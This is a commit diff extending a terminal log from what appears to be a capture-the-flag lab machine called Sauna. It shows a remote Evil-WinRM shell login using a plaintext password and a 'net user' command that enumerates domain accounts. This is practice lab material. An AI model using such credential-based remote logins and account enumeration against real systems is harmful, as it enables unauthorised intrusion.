aadccb0e61ea9a47a0c8e3d3158c15b1cebadaa0
Allen West <58156836+allenwest24@users.noreply.github.com>
2020-04-16 16:18:29 -0400

    Update asFsmith.bash

--- Sauna/asFsmith.bash
+++ Sauna/asFsmith.bash
@@ -21,3 +21,30 @@ Mode                LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
 ********************************
 *Evil-WinRM* PS C:\Users\FSmith\Desktop> 
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> exit
+
+Info: Exiting with code 0
+
+allenwest1@debian:~$ evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            FSmith                   Guest
+HSmith                   krbtgt                   svc_loanmgr
+The command completed with one or more errors.
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> 
+.
+.
+.
+// TBC
+.
+.
+.
